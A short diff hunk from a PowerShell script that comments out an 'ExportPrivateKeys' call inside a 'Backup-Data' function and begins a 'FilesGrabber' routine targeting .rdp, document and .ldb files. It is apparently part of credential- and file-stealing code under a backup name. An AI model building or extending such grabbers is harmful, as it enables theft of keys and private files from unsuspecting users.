@@ -1034,7 +1034,7 @@ function Backup-Data {
             }
         }
     }
-    ExportPrivateKeys
+    #ExportPrivateKeys
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
